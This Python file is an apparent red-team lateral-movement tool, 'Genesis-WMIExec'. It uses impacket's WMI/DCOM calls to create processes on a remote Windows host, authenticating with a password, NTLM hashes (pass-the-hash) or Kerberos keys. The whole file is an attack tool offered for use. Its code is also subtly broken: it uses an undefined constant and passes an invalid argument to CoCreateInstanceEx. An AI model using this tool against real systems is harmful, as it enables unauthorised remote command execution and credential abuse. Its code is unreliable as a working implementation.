#!/usr/bin/env python3

# redteam_toolkit/lateral_movement/wmi_exec/wmi_exec.py
# Genesis-WMIExec v3.1 — расширенное выполнение команд через WMI (T1047)

import argparse
import logging
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom.wmi import IWbemLevel1Login, WBEM_FLAG_FORWARD_ONLY
from impacket.dcerpc.v5.dcomrt import OBJREF_CUSTOM
from impacket.examples.utils import parse_target

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("Genesis-WMIExec")

def exec_remote_wmi(addr, username, password='', domain='', lmhash='', nthash='', command='whoami', aesKey=None, do_kerberos=False):
    try:
        logger.info(f"[+] Connecting to {addr} via WMI as {domain}\\{username}")
        dcom = DCOMConnection(addr, username, password, domain, lmhash, nthash, aesKey, doKerberos=do_kerberos)
        iInterface = dcom.CoCreateInstanceEx("WbemScripting.SWbemLocator", IID=IWbemLevel1Login._iid_, clsctx=CLSCTX_LOCAL_SERVER)
        iWbemLevel1Login = IWbemLevel1Login(iInterface)
        namespace = iWbemLevel1Login.NTLMLogin("//./root/cimv2", None, None)
        iWbemLevel1Login.RemRelease()

        exec_result = namespace.ExecQuery(
            "SELECT * FROM Win32_Process", "WQL", WBEM_FLAG_FORWARD_ONLY
        )
        process = namespace.GetObject("Win32_Process")
        ret, pid = process.Create(command, None, None)
        if ret == 0:
            logger.info(f"[+] Command executed successfully, PID={pid}")
        else:
            logger.error(f"[-] WMI execution failed with code {ret}")

        namespace.RemRelease()
        dcom.disconnect()
    except Exception as e:
        logger.error(f"[-] WMIExec error: {e}")

def parse_args():
    parser = argparse.ArgumentParser(description="Genesis WMIExec - Lateral movement via WMI (T1047)")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", help="Password")
    parser.add_argument("-d", "--domain", default="", help="Domain name")
    parser.add_argument("--hashes", help="LM:NT hash format")
    parser.add_argument("--aeskey", help="AES key for Kerberos auth")
    parser.add_argument("--kerberos", action="store_true", help="Use Kerberos authentication")
    parser.add_argument("-c", "--command", default="whoami", help="Command to execute")
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    lmhash = nthash = ''
    if args.hashes:
        if ':' in args.hashes:
            lmhash, nthash = args.hashes.split(':')
        else:
            nthash = args.hashes

    exec_remote_wmi(
        addr=args.target,
        username=args.username,
        password=args.password or '',
        domain=args.domain,
        lmhash=lmhash,
        nthash=nthash,
        aesKey=args.aeskey,
        do_kerberos=args.kerberos,
        command=args.command
    )
